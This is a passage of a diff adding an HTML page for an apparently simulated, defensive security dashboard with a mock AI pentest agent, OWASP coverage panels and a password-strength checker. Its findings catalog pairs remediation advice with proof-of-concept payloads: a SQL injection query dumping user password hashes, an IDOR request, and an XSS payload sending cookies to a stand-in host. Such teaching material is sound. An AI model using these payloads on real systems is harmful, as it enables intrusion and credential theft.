@@ -1,0 +1,853 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Sentinel Cyber Command Center — an autonomous AI pentest agent, live threat radar, OWASP coverage, attack-surface mapping and credential hardening in one defensive SOC console.">
+<style>html,body{margin:0}img{max-width:100%}[hidden]{display:none!important}</style>
+</head>
+<body>
+<title>SENTINEL Cyber Command</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+  :root{
+    --bg:#04070d; --bg-2:#060b14;
+    --panel:rgba(9,15,24,.82); --panel-solid:#0a1018;
+    --hairline:rgba(56,240,255,.16); --hairline-2:rgba(56,240,255,.30);
+    --grid:rgba(56,240,255,.045);
+    --ink:#dfeaf2; --ink-2:rgba(223,234,242,.60); --ink-3:rgba(223,234,242,.34);
+    --cyan:#38f0ff; --cyan-rgb:56,240,255;
+    --violet:#8b7bff; --violet-rgb:139,123,255;
+    --good:#3ef0a3; --warn:#ffb347; --crit:#ff4d6a; --info:#59b6ff;
+    --good-rgb:62,240,163; --warn-rgb:255,179,71; --crit-rgb:255,77,106;
+    --radius:5px;
+    --shadow:0 18px 46px rgba(0,0,0,.6), 0 0 0 1px rgba(56,240,255,.05), inset 0 1px 0 rgba(160,240,255,.06);
+    --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
+    --disp:'Chakra Petch',system-ui,sans-serif;
+    --body:'IBM Plex Sans',system-ui,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0}
+  .app{
+    min-height:100vh; color:var(--ink); font-family:var(--body);
+    background:
+      radial-gradient(1200px 700px at 78% -8%, rgba(var(--violet-rgb),.10), transparent 60%),
+      radial-gradient(1100px 620px at 12% 108%, rgba(var(--cyan-rgb),.09), transparent 60%),
+      linear-gradient(180deg,var(--bg),var(--bg-2));
+    position:relative; overflow-x:hidden;
+  }
+  .app::before{ /* survey grid film */
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:0;
+    background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);
+    background-size:46px 46px; mask-image:radial-gradient(120% 100% at 50% 0,#000 45%,transparent 100%);
+  }
+  .wrap{position:relative; z-index:1; max-width:1320px; margin:0 auto; padding:0 20px 72px}
+
+  /* ---------- command bar ---------- */
+  .bar{
+    position:sticky; top:0; z-index:20; display:flex; align-items:center; gap:18px;
+    padding:14px 20px; margin:0 -20px 26px;
+    background:linear-gradient(180deg,rgba(4,7,13,.94),rgba(4,7,13,.72));
+    backdrop-filter:blur(10px); border-bottom:1px solid var(--hairline);
+  }
+  .logo{display:flex; align-items:center; gap:12px; min-width:0}
+  .glyph{
+    width:34px; height:34px; flex:none; border:1px solid var(--hairline-2); border-radius:4px;
+    display:grid; place-items:center; background:radial-gradient(circle at 50% 30%,rgba(var(--cyan-rgb),.22),transparent 70%);
+    box-shadow:0 0 22px rgba(var(--cyan-rgb),.25) inset;
+  }
+  .glyph svg{width:20px;height:20px}
+  .brand{font-family:var(--disp); font-weight:700; letter-spacing:.16em; font-size:15px; text-transform:uppercase; line-height:1}
+  .brand small{display:block; font-family:var(--mono); font-weight:400; letter-spacing:.28em; font-size:9px; color:var(--ink-3); margin-top:4px}
+  .bar-spacer{flex:1}
+  .bar-stat{display:flex; flex-direction:column; align-items:flex-end; gap:3px; font-family:var(--mono)}
+  .bar-stat b{font-size:15px; letter-spacing:.05em}
+  .bar-stat span{font-size:9px; letter-spacing:.22em; text-transform:uppercase; color:var(--ink-3)}
+  .live{display:inline-flex; align-items:center; gap:7px; font-family:var(--mono); font-size:10px; letter-spacing:.2em; text-transform:uppercase; color:var(--good)}
+  .live .dot{width:8px;height:8px;border-radius:50%;background:var(--good); box-shadow:0 0 10px var(--good); animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+
+  /* ---------- hero ---------- */
+  .hero{margin-bottom:26px}
+  .eyebrow{font-family:var(--mono); font-size:10px; letter-spacing:.34em; text-transform:uppercase; color:var(--cyan); display:flex; align-items:center; gap:10px}
+  .eyebrow::before{content:""; width:26px; height:1px; background:var(--cyan); box-shadow:0 0 8px var(--cyan)}
+  h1{font-family:var(--disp); font-weight:700; font-size:clamp(30px,5vw,52px); line-height:1.02; letter-spacing:-.01em; margin:14px 0 12px; text-wrap:balance; max-width:20ch}
+  h1 em{font-style:normal; color:var(--cyan); text-shadow:0 0 26px rgba(var(--cyan-rgb),.4)}
+  .lede{max-width:64ch; color:var(--ink-2); font-size:15.5px; line-height:1.65}
+  .kpis{display:grid; grid-template-columns:repeat(4,1fr); gap:12px; margin-top:22px}
+  .kpi{background:var(--panel); border:1px solid var(--hairline); border-radius:var(--radius); padding:14px 16px; position:relative; overflow:hidden}
+  .kpi .k-lab{font-family:var(--mono); font-size:9.5px; letter-spacing:.2em; text-transform:uppercase; color:var(--ink-3)}
+  .kpi .k-val{font-family:var(--disp); font-weight:600; font-size:26px; margin-top:6px; font-variant-numeric:tabular-nums}
+  .kpi .k-sub{font-family:var(--mono); font-size:10px; color:var(--ink-2); margin-top:2px}
+  .kpi::after{content:""; position:absolute; left:0; top:0; bottom:0; width:3px; background:var(--cyan); opacity:.8}
+  .kpi.warn::after{background:var(--warn)} .kpi.crit::after{background:var(--crit)} .kpi.good::after{background:var(--good)}
+
+  /* ---------- panels & grid ---------- */
+  .grid{display:grid; gap:18px}
+  .cols-2{grid-template-columns:1.55fr 1fr}
+  .cols-3{grid-template-columns:repeat(3,1fr)}
+  .panel{
+    background:var(--panel); border:1px solid var(--hairline); border-radius:var(--radius);
+    box-shadow:var(--shadow); position:relative; padding:18px 18px 20px;
+  }
+  .panel::before,.panel::after{content:""; position:absolute; width:12px; height:12px; pointer-events:none}
+  .panel::before{top:7px; left:7px; border-top:1px solid rgba(var(--cyan-rgb),.5); border-left:1px solid rgba(var(--cyan-rgb),.5)}
+  .panel::after{bottom:7px; right:7px; border-bottom:1px solid rgba(var(--cyan-rgb),.5); border-right:1px solid rgba(var(--cyan-rgb),.5)}
+  .p-head{display:flex; align-items:center; gap:10px; margin-bottom:16px}
+  .p-head h2{font-family:var(--disp); font-weight:600; font-size:14px; letter-spacing:.14em; text-transform:uppercase; margin:0}
+  .p-head .tag{margin-left:auto; font-family:var(--mono); font-size:9.5px; letter-spacing:.18em; text-transform:uppercase; color:var(--ink-3); border:1px solid var(--hairline); border-radius:3px; padding:3px 8px}
+  .p-ico{width:26px;height:26px;border:1px solid var(--hairline-2); border-radius:4px; display:grid; place-items:center; color:var(--cyan)}
+  .p-ico svg{width:15px;height:15px}
+  .section-mt{margin-top:18px}
+
+  /* ---------- AI agent console ---------- */
+  .agent{--accent:var(--violet); --accent-rgb:var(--violet-rgb)}
+  .agent .p-ico{color:var(--violet); border-color:rgba(var(--violet-rgb),.4)}
+  .agent .p-head .tag{color:var(--violet); border-color:rgba(var(--violet-rgb),.4)}
+  .target-row{display:flex; gap:10px; flex-wrap:wrap; align-items:center; margin-bottom:14px}
+  .field{flex:1; min-width:220px; display:flex; align-items:center; gap:9px; background:rgba(0,0,0,.35); border:1px solid var(--hairline); border-radius:4px; padding:9px 12px; font-family:var(--mono); font-size:13px}
+  .field span{color:var(--violet)}
+  .field select{flex:1; background:transparent; border:0; color:var(--ink); font-family:var(--mono); font-size:13px; outline:none}
+  .field select option{background:var(--panel-solid)}
+  .btn{
+    font-family:var(--disp); font-weight:600; letter-spacing:.12em; text-transform:uppercase; font-size:12px;
+    color:#05070c; background:var(--violet); border:0; border-radius:4px; padding:11px 18px; cursor:pointer;
+    display:inline-flex; align-items:center; gap:8px; transition:transform .12s, box-shadow .12s, background .12s;
+    box-shadow:0 0 20px rgba(var(--violet-rgb),.35);
+  }
+  .btn:hover{transform:translateY(-1px); box-shadow:0 0 30px rgba(var(--violet-rgb),.55)}
+  .btn:disabled{opacity:.5; cursor:not-allowed; transform:none; box-shadow:none}
+  .btn.ghost{background:transparent; color:var(--ink); border:1px solid var(--hairline-2); box-shadow:none}
+  .btn.ghost:hover{border-color:var(--cyan); color:var(--cyan)}
+  .btn svg{width:14px;height:14px}
+  .agent-flow{display:flex; gap:6px; margin-bottom:12px; flex-wrap:wrap}
+  .phase{flex:1; min-width:92px; border:1px solid var(--hairline); border-radius:4px; padding:8px 10px; font-family:var(--mono); font-size:9.5px; letter-spacing:.14em; text-transform:uppercase; color:var(--ink-3); position:relative; transition:.3s}
+  .phase .ph-i{font-size:8px; opacity:.6}
+  .phase.active{border-color:var(--violet); color:var(--violet); box-shadow:0 0 16px rgba(var(--violet-rgb),.25) inset}
+  .phase.done{border-color:rgba(var(--good-rgb),.5); color:var(--good)}
+  .phase.done::after{content:"✓"; position:absolute; right:8px; top:7px}
+  .term{
+    background:#03060c; border:1px solid var(--hairline); border-radius:5px; padding:14px 15px;
+    font-family:var(--mono); font-size:12.5px; line-height:1.6; height:290px; overflow-y:auto;
+    box-shadow:inset 0 0 30px rgba(0,0,0,.6);
+  }
+  .term::-webkit-scrollbar{width:8px} .term::-webkit-scrollbar-thumb{background:rgba(var(--cyan-rgb),.25); border-radius:8px}
+  .ln{white-space:pre-wrap; word-break:break-word}
+  .ln .t{color:var(--ink-3)} .ln .ok{color:var(--good)} .ln .info{color:var(--info)}
+  .ln .warn{color:var(--warn)} .ln .crit{color:var(--crit)} .ln .agn{color:var(--violet)}
+  .ln .dim{color:var(--ink-3)}
+  .cursor{display:inline-block; width:8px; height:14px; background:var(--violet); vertical-align:-2px; animation:blink 1s steps(1) infinite}
+  @keyframes blink{50%{opacity:0}}
+
+  /* ---------- posture gauge ---------- */
+  .gauge-wrap{display:flex; flex-direction:column; align-items:center; gap:4px}
+  .gauge{position:relative; width:210px; height:210px}
+  .gauge .score{position:absolute; inset:0; display:grid; place-items:center; text-align:center}
+  .gauge .score b{font-family:var(--disp); font-weight:700; font-size:52px; line-height:1; font-variant-numeric:tabular-nums; display:block}
+  .gauge .score span{font-family:var(--mono); font-size:10px; letter-spacing:.24em; text-transform:uppercase; color:var(--ink-3); margin-top:4px; display:block}
+  .grade{font-family:var(--mono); font-size:10px; letter-spacing:.2em; text-transform:uppercase; margin-top:2px}
+  .breakdown{width:100%; margin-top:14px; display:flex; flex-direction:column; gap:11px}
+  .brk{font-family:var(--mono); font-size:11px}
+  .brk-top{display:flex; justify-content:space-between; margin-bottom:5px}
+  .brk-top span{letter-spacing:.14em; text-transform:uppercase; font-size:9.5px; color:var(--ink-2)}
+  .brk-bar{height:6px; background:rgba(255,255,255,.06); border-radius:6px; overflow:hidden}
+  .brk-fill{height:100%; border-radius:6px; transition:width .8s cubic-bezier(.2,.7,.2,1)}
+
+  /* ---------- radar ---------- */
+  .radar-shell{display:flex; gap:16px; align-items:stretch}
+  .radar-box{flex:none; width:220px; position:relative}
+  #radar{display:block; width:220px; height:220px}
+  .feed{flex:1; display:flex; flex-direction:column; gap:6px; overflow:hidden; max-height:220px}
+  .fe{font-family:var(--mono); font-size:11px; display:flex; gap:8px; align-items:baseline; opacity:0; transform:translateX(8px); animation:slidein .4s forwards; padding:5px 8px; border-radius:3px; background:rgba(255,255,255,.02)}
+  @keyframes slidein{to{opacity:1; transform:none}}
+  .fe .fx{font-size:9px; letter-spacing:.1em; padding:1px 6px; border-radius:3px; text-transform:uppercase; flex:none}
+  .fe .blocked{color:var(--good); border:1px solid rgba(var(--good-rgb),.4)}
+  .fe .flagged{color:var(--warn); border:1px solid rgba(var(--warn-rgb),.4)}
+  .fe .critical{color:var(--crit); border:1px solid rgba(var(--crit-rgb),.5)}
+  .fe .src{color:var(--ink); flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
+  .fe .tm{color:var(--ink-3); flex:none}
+
+  /* ---------- owasp matrix ---------- */
+  .owasp{display:grid; grid-template-columns:repeat(2,1fr); gap:9px}
+  .ow{display:flex; align-items:center; gap:10px; padding:10px 12px; border:1px solid var(--hairline); border-radius:4px; background:rgba(0,0,0,.2)}
+  .ow .oc{font-family:var(--mono); font-size:10px; color:var(--ink-3); flex:none; width:30px}
+  .ow .on{font-size:12px; flex:1; line-height:1.3}
+  .ow .os{width:9px; height:9px; border-radius:50%; flex:none}
+  .os.pass{background:var(--good); box-shadow:0 0 8px var(--good)}
+  .os.warn{background:var(--warn); box-shadow:0 0 8px var(--warn)}
+  .os.fail{background:var(--crit); box-shadow:0 0 8px var(--crit)}
+
+  /* ---------- findings table ---------- */
+  .filters{display:flex; gap:7px; flex-wrap:wrap; margin-bottom:14px}
+  .chip{font-family:var(--mono); font-size:10px; letter-spacing:.1em; text-transform:uppercase; padding:6px 12px; border:1px solid var(--hairline); border-radius:20px; background:transparent; color:var(--ink-2); cursor:pointer; transition:.15s}
+  .chip:hover{border-color:var(--hairline-2); color:var(--ink)}
+  .chip.on{background:var(--cyan); color:#05070c; border-color:var(--cyan); font-weight:700}
+  .tbl-scroll{overflow-x:auto}
+  table{width:100%; border-collapse:collapse; font-size:13px; min-width:640px}
+  th{font-family:var(--mono); font-size:9.5px; letter-spacing:.16em; text-transform:uppercase; color:var(--ink-3); text-align:left; padding:0 12px 10px; font-weight:400; border-bottom:1px solid var(--hairline)}
+  td{padding:13px 12px; border-bottom:1px solid rgba(255,255,255,.045); vertical-align:top}
+  tr:last-child td{border-bottom:0}
+  tr.f-row{cursor:pointer; transition:background .15s}
+  tr.f-row:hover{background:rgba(var(--cyan-rgb),.04)}
+  .sev{font-family:var(--mono); font-size:9.5px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; padding:3px 9px; border-radius:3px; white-space:nowrap}
+  .sev.critical{color:var(--crit); background:rgba(var(--crit-rgb),.12); border:1px solid rgba(var(--crit-rgb),.4)}
+  .sev.high{color:#ff8a5c; background:rgba(255,138,92,.12); border:1px solid rgba(255,138,92,.4)}
+  .sev.medium{color:var(--warn); background:rgba(var(--warn-rgb),.12); border:1px solid rgba(var(--warn-rgb),.4)}
+  .sev.low{color:var(--info); background:rgba(89,182,255,.12); border:1px solid rgba(89,182,255,.4)}
+  .f-name{font-weight:600} .f-name .cwe{font-family:var(--mono); font-size:10px; color:var(--ink-3); font-weight:400; margin-left:6px}
+  .cvss{font-family:var(--mono); font-variant-numeric:tabular-nums; font-weight:700}
+  .f-target{font-family:var(--mono); font-size:11.5px; color:var(--ink-2)}
+  .f-detail{display:none}
+  .f-detail.open{display:table-row}
+  .f-detail td{background:rgba(0,0,0,.28); padding:0}
+  .f-detail-inner{padding:16px 18px; display:grid; grid-template-columns:1fr 1fr; gap:18px}
+  .f-detail-inner h4{font-family:var(--mono); font-size:9.5px; letter-spacing:.16em; text-transform:uppercase; color:var(--cyan); margin:0 0 7px}
+  .f-detail-inner p{margin:0; font-size:12.5px; line-height:1.6; color:var(--ink-2)}
+  .f-detail-inner code{font-family:var(--mono); font-size:11.5px; color:var(--warn); background:rgba(0,0,0,.4); padding:2px 6px; border-radius:3px; display:block; margin-top:6px; white-space:pre-wrap; word-break:break-all}
+  .f-fix{color:var(--good) !important}
+  .empty{text-align:center; padding:40px; color:var(--ink-3); font-family:var(--mono); font-size:12px}
+
+  /* ---------- credential lab ---------- */
+  .cred-in{display:flex; align-items:center; gap:10px; background:rgba(0,0,0,.35); border:1px solid var(--hairline); border-radius:4px; padding:11px 14px; margin-bottom:14px}
+  .cred-in input{flex:1; background:transparent; border:0; color:var(--ink); font-family:var(--mono); font-size:14px; outline:none; letter-spacing:.05em}
+  .cred-in button{background:transparent; border:0; color:var(--ink-3); cursor:pointer; font-family:var(--mono); font-size:10px; letter-spacing:.1em; text-transform:uppercase}
+  .cred-in button:hover{color:var(--cyan)}
+  .meter{height:8px; border-radius:8px; background:rgba(255,255,255,.06); overflow:hidden; margin-bottom:8px}
+  .meter-fill{height:100%; width:0; border-radius:8px; transition:width .35s, background .35s}
+  .cred-verdict{display:flex; justify-content:space-between; font-family:var(--mono); font-size:11px; margin-bottom:16px}
+  .cred-grid{display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:14px}
+  .cred-stat{border:1px solid var(--hairline); border-radius:4px; padding:11px 12px; background:rgba(0,0,0,.2)}
+  .cred-stat .cs-l{font-family:var(--mono); font-size:9px; letter-spacing:.16em; text-transform:uppercase; color:var(--ink-3)}
+  .cred-stat .cs-v{font-family:var(--disp); font-weight:600; font-size:18px; margin-top:4px; font-variant-numeric:tabular-nums}
+  .cred-checks{display:flex; flex-direction:column; gap:7px}
+  .cc{font-family:var(--mono); font-size:11.5px; display:flex; gap:9px; align-items:center; color:var(--ink-2)}
+  .cc .mk{width:16px; text-align:center; flex:none}
+  .cc.pass .mk{color:var(--good)} .cc.fail .mk{color:var(--crit)}
+  .note{font-family:var(--mono); font-size:10px; color:var(--ink-3); line-height:1.6; margin-top:14px; padding-top:12px; border-top:1px solid var(--hairline)}
+
+  /* ---------- footer ---------- */
+  footer{margin-top:44px; padding-top:22px; border-top:1px solid var(--hairline); display:flex; flex-wrap:wrap; gap:16px; align-items:center; font-family:var(--mono); font-size:10.5px; color:var(--ink-3); letter-spacing:.06em}
+  footer .fb{color:var(--cyan)}
+  .disc{background:rgba(var(--warn-rgb),.06); border:1px solid rgba(var(--warn-rgb),.28); border-radius:5px; padding:13px 16px; margin-top:22px; font-family:var(--mono); font-size:11px; line-height:1.6; color:var(--ink-2); display:flex; gap:12px}
+  .disc svg{width:18px;height:18px; flex:none; color:var(--warn); margin-top:1px}
+
+  @media (max-width:900px){
+    .cols-2,.cols-3{grid-template-columns:1fr}
+    .kpis{grid-template-columns:repeat(2,1fr)}
+    .owasp{grid-template-columns:1fr}
+    .radar-shell{flex-direction:column} .radar-box{width:100%; display:grid; place-items:center}
+    .f-detail-inner{grid-template-columns:1fr}
+    .bar-stat.hide-sm{display:none}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{animation-duration:.001ms !important; animation-iteration-count:1 !important; scroll-behavior:auto}
+  }
+</style>
+
+<div class="app">
+  <div class="wrap">
+
+    <!-- COMMAND BAR -->
+    <div class="bar">
+      <div class="logo">
+        <div class="glyph" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#38f0ff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 2 4 5v6c0 5 3.5 8 8 11 4.5-3 8-6 8-11V5z"/><path d="M9 12l2 2 4-4"/>
+          </svg>
+        </div>
+        <div class="brand">Sentinel<small>Cyber Command Center</small></div>
+      </div>
+      <div class="bar-spacer"></div>
+      <div class="bar-stat hide-sm"><b id="bar-threats">0</b><span>Threats blocked</span></div>
+      <div class="bar-stat hide-sm"><b id="bar-open" style="color:var(--warn)">0</b><span>Open findings</span></div>
+      <div class="bar-stat"><b id="bar-clock" style="color:var(--cyan)">--:--:--</b><span>UTC · <span class="live"><span class="dot"></span>Online</span></span></div>
+    </div>
+
+    <!-- HERO -->
+    <header class="hero">
+      <div class="eyebrow">Autonomous Security Operations</div>
+      <h1>Your entire security posture, on <em>one screen</em>.</h1>
+      <p class="lede">Sentinel unifies an autonomous AI pentest agent, live threat radar, OWASP coverage, attack-surface mapping and credential hardening into a single command console. Deploy the agent against a target and watch it reconnoiter, probe and report — then remediate straight from the findings board.</p>
+      <div class="kpis">
+        <div class="kpi good"><div class="k-lab">Security Posture</div><div class="k-val" id="kpi-score">—</div><div class="k-sub" id="kpi-grade">awaiting scan</div></div>
+        <div class="kpi"><div class="k-lab">Assets Monitored</div><div class="k-val" id="kpi-assets">18</div><div class="k-sub">4 subnets · 2 clouds</div></div>
+        <div class="kpi crit"><div class="k-lab">Critical / High</div><div class="k-val" id="kpi-crit">0</div><div class="k-sub">across all findings</div></div>
+        <div class="kpi warn"><div class="k-lab">Mean Time To Detect</div><div class="k-val">1.9<span style="font-size:14px">s</span></div><div class="k-sub">agent telemetry</div></div>
+      </div>
+    </header>
+
+    <!-- ROW: AGENT + POSTURE -->
+    <div class="grid cols-2">
+      <!-- AI PENTEST AGENT -->
+      <section class="panel agent" aria-labelledby="agent-h">
+        <div class="p-head">
+          <div class="p-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 21h8M12 18v3M8 9l2 2-2 2M14 13h2"/></svg></div>
+          <h2 id="agent-h">AI Pentest Agent</h2>
+          <span class="tag" id="agent-tag">Idle</span>
+        </div>
+        <div class="target-row">
+          <label class="field"><span>▸</span>
+            <select id="target" aria-label="Target">
+              <option value="demo-shop.sentinel.test">demo-shop.sentinel.test — e-commerce</option>
+              <option value="api.acme-internal.test">api.acme-internal.test — REST API</option>
+              <option value="vault.acme-internal.test">vault.acme-internal.test — secrets store</option>
+              <option value="portal.northwind.test">portal.northwind.test — customer portal</option>
+            </select>
+          </label>
+          <button class="btn" id="deploy">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 3l14 9-14 9z"/></svg>
+            Deploy Agent
+          </button>
+        </div>
+        <div class="agent-flow" id="flow"></div>
+        <div class="term" id="term" role="log" aria-live="polite" aria-label="Agent activity log"></div>
+      </section>
+
+      <!-- POSTURE GAUGE -->
+      <section class="panel" aria-labelledby="posture-h">
+        <div class="p-head">
+          <div class="p-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a9 9 0 1 0 9 9"/><path d="M12 12l6-6"/><circle cx="12" cy="12" r="1.6"/></svg></div>
+          <h2 id="posture-h">Posture Index</h2>
+          <span class="tag">Weighted CVSS</span>
+        </div>
+        <div class="gauge-wrap">
+          <div class="gauge">
+            <svg viewBox="0 0 120 120" width="210" height="210">
+              <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(255,255,255,.06)" stroke-width="9"/>
+              <circle id="gauge-arc" cx="60" cy="60" r="52" fill="none" stroke="var(--good)" stroke-width="9" stroke-linecap="round" stroke-dasharray="326.7" stroke-dashoffset="326.7" transform="rotate(-90 60 60)" style="transition:stroke-dashoffset 1s cubic-bezier(.2,.7,.2,1), stroke .6s"/>
+            </svg>
+            <div class="score"><div><b id="gauge-num">—</b><span>/ 100</span></div></div>
+          </div>
+          <div class="grade" id="gauge-grade" style="color:var(--ink-3)">RUN A SCAN TO RATE</div>
+        </div>
+        <div class="breakdown" id="breakdown"></div>
+      </section>
+    </div>
+
+    <!-- ROW: RADAR + OWASP -->
+    <div class="grid cols-2 section-mt">
+      <section class="panel" aria-labelledby="radar-h">
+        <div class="p-head">
+          <div class="p-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4"/><path d="M12 12l7-4"/></svg></div>
+          <h2 id="radar-h">Threat Radar</h2>
+          <span class="tag"><span class="live"><span class="dot"></span>Live</span></span>
+        </div>
+        <div class="radar-shell">
+          <div class="radar-box"><canvas id="radar" width="440" height="440"></canvas></div>
+          <div class="feed" id="feed"></div>
+        </div>
+      </section>
+
+      <section class="panel" aria-labelledby="owasp-h">
+        <div class="p-head">
+          <div class="p-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg></div>
+          <h2 id="owasp-h">OWASP Top 10 Coverage</h2>
+          <span class="tag" id="owasp-tag">—</span>
+        </div>
+        <div class="owasp" id="owasp"></div>
+      </section>
+    </div>
+
+    <!-- FINDINGS -->
+    <section class="panel section-mt" aria-labelledby="find-h">
+      <div class="p-head">
+        <div class="p-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l9 4v6c0 5-3.6 8.5-9 10-5.4-1.5-9-5-9-10V6z"/><path d="M12 8v5M12 16h.01"/></svg></div>
+        <h2 id="find-h">Vulnerability Findings</h2>
+        <span class="tag" id="find-count">0 findings</span>
+      </div>
+      <div class="filters" id="filters">
+        <button class="chip on" data-sev="all">All</button>
+        <button class="chip" data-sev="critical">Critical</button>
+        <button class="chip" data-sev="high">High</button>
+        <button class="chip" data-sev="medium">Medium</button>
+        <button class="chip" data-sev="low">Low</button>
+      </div>
+      <div class="tbl-scroll">
+        <table>
+          <thead><tr><th style="width:110px">Severity</th><th>Finding</th><th style="width:74px">CVSS</th><th style="width:190px">Target</th></tr></thead>
+          <tbody id="findings"></tbody>
+        </table>
+      </div>
+      <div class="empty" id="find-empty">No scan has run yet. Deploy the AI Pentest Agent above to populate the findings board.</div>
+    </section>
+
+    <!-- CREDENTIAL LAB -->
+    <section class="panel section-mt" aria-labelledby="cred-h">
+      <div class="p-head">
+        <div class="p-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></div>
+        <h2 id="cred-h">Credential Hardening Lab</h2>
+        <span class="tag">Runs locally</span>
+      </div>
+      <div class="grid cols-2">
+        <div>
+          <div class="cred-in">
+            <input id="pw" type="password" placeholder="Type a passphrase to stress-test…" autocomplete="off" spellcheck="false">
+            <button id="pw-toggle" type="button">Show</button>
+          </div>
+          <div class="meter"><div class="meter-fill" id="pw-meter"></div></div>
+          <div class="cred-verdict"><span id="pw-label" style="color:var(--ink-3)">Awaiting input</span><span id="pw-crack" style="color:var(--ink-2)"></span></div>
+          <div class="cred-grid">
+            <div class="cred-stat"><div class="cs-l">Entropy</div><div class="cs-v" id="pw-entropy">0<span style="font-size:11px"> bits</span></div></div>
+            <div class="cred-stat"><div class="cs-l">Length</div><div class="cs-v" id="pw-len">0</div></div>
+            <div class="cred-stat"><div class="cs-l">Charset</div><div class="cs-v" id="pw-charset">0</div></div>
+          </div>
+        </div>
+        <div>
+          <div class="cred-checks" id="pw-checks"></div>
+          <div class="note">Analysis happens entirely in your browser — nothing is transmitted, logged, or stored. The crack-time estimate assumes an offline attacker at 100 billion guesses/second against a fast hash, a deliberately pessimistic benchmark for hardening.</div>
+        </div>
+      </div>
+    </section>
+
+    <div class="disc">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l10 18H2z"/><path d="M12 9v5M12 17h.01"/></svg>
+      <div><b>Simulation & training environment.</b> Targets ending in <code style="font-family:var(--mono);color:var(--warn)">.test</code> are non-routable demonstration hosts. Sentinel models a defensive SOC workflow and OWASP-based findings for education and blue-team drills — it does not scan, connect to, or attack live systems. Only test infrastructure you own or are explicitly authorized to assess.</div>
+    </div>
+
+    <footer>
+      <span class="fb">SENTINEL</span>
+      <span>Cyber Command Center</span>
+      <span>· Defensive · OWASP-aligned · No data leaves your browser</span>
+      <span style="margin-left:auto" id="foot-time"></span>
+    </footer>
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+  var $=function(s,r){return (r||document).querySelector(s)};
+  var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion:reduce)').matches;
+
+  /* ---------------- FINDINGS CATALOG (per target) ---------------- */
+  var CATALOG = {
+    "demo-shop.sentinel.test":[
+      {sev:"critical",cvss:9.8,name:"SQL injection in product search",cwe:"CWE-89",owasp:"A03",target:"/api/search?q=",
+        desc:"The search endpoint concatenates the q parameter directly into a SQL statement. A crafted payload returned the full users table, including password hashes.",
+        poc:"q=1' UNION SELECT email,pass_hash,role FROM users-- -",
+        fix:"Use parameterized queries / prepared statements. Never build SQL from string concatenation. Add an allow-list validator on the search term."},
+      {sev:"high",cvss:8.1,name:"Broken access control on orders (IDOR)",cwe:"CWE-639",owasp:"A01",target:"/api/orders/{id}",
+        desc:"Order IDs are sequential and unchecked against the session. Incrementing the id exposed other customers' orders — the same class as the negative-total order abuse.",
+        poc:"GET /api/orders/1042  →  returns order for a different user",
+        fix:"Enforce object-level authorization: verify the order belongs to the authenticated user server-side before returning it. Use non-guessable identifiers."},
+      {sev:"high",cvss:7.5,name:"Business-logic flaw: negative quantity",cwe:"CWE-840",owasp:"A04",target:"/api/cart",
+        desc:"The cart accepts negative quantities, producing an order with a negative total that credits the account — reproducing the 'Order with negative total created' impact.",
+        poc:'{"item":"SKU-12","qty":-3}  →  Total Price: $-149.90',
+        fix:"Validate quantity as a positive integer server-side and recompute totals on the server; never trust client-supplied prices or amounts."},
+      {sev:"medium",cvss:6.1,name:"Reflected XSS in error page",cwe:"CWE-79",owasp:"A03",target:"/404?path=",
+        desc:"The 404 handler echoes the requested path without encoding, allowing script execution in a victim's browser.",
+        poc:"/404?path=<scr"+"ipt>document.location='//evil'+document.cookie<\/scr"+"ipt>",
+        fix:"Context-aware output encoding on all reflected values and a strict Content-Security-Policy that disallows inline script."},
+      {sev:"medium",cvss:5.3,name:"Missing security headers",cwe:"CWE-693",owasp:"A05",target:"* (all responses)",
+        desc:"Responses lack HSTS, X-Content-Type-Options, and a Content-Security-Policy, widening the impact of other flaws.",
